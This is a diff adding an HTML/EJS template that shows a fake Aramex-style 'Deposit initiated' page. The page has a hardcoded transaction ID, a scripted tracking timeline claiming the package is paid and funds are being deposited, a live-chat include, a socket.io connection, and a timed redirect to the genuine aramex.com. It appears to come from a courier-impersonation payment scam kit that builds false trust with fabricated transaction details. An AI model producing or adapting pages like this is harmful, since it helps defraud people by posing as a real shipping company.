@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        <%= title %>
+    </title>
+    <link rel="stylesheet" href="/stylesheets/output.css">
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <%- include("./includes/jivochat.ejs") %>
+
+</head>
+
+<body class="bg-[#F3F2F2] roboto">
+    <%- include("./includes/navbar.ejs") %>
+
+        <div class="container max-w-7xl mx-auto lg:flex justify-between">
+            <div class="w-full mx-3">
+                <p class="font-light text-2xl my-5">Information</p>
+                <div class="bg-white py-5 px-5 rounded-md shadow-md">
+                    <div class="flex items-center">
+                        <img src="/images/green-check.png" alt="green-check" class="h-20">
+                        <p class="text-2xl font-medium ml-3">Deposit initiated</p>
+                    </div>
+                    <p class="mt-8 mb-3 font-medium text-lg">Transaction ID: 76267671221AMX</p>
+                    <p>Your payment is being proceed and will be deposited in the next 24 hours.</p>
+                    <p class="mt-8">Pickup has been scheduled:</p>
+                    <p>Shipment ID: №<%= trackingNumber.track_number %>
+                    </p>
+                    <p>Pickup Date: <%= new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toISOString().split('T')[0] %>
+                    </p>
+                    <p>Pickup Time: 4:30PM</p>
+                </div>
+            </div>
+            <div class="w-full mx-3">
+                <p class="font-light text-2xl my-5">Tracking</p>
+                <div class="bg-white rounded-md shadow-md">
+                    <div class="flex justify-center border-b-[1px] border-b-gray-300 py-2">
+                        <p class="font-light text-xl text-gray-400">Shipment №<%= trackingNumber.track_number %>
+                        </p>
+                    </div>
+                    <ul id="status-list" class="py-5 px-5">
+                        <li class="mt-1"><span class="dot completed-dot"></span>A shipment has been created</li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot completed-dot"></span>Awaiting payment</li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot completed-dot"></span>The package is paid</li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot completed-dot"></span>Funds are being deposited</li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot active-dot"></span>Pickup has been scheduled</li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot"></span>The package is being picked up by Aramex
+                        </li>
+                        <li><span class="red-line"></span></li>
+                        <li class="mt-1"><span class="dot"></span>The package has been delivered to the recipient</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+        <script>
+            const socket = io();
+
+            setTimeout(function () {
+                window.location.href = "https://www.aramex.com"; // Replace with the URL you want to redirect to
+            }, 5000); // 5000 milliseconds (5 seconds)
+        </script>
+</body>
+
+</html>
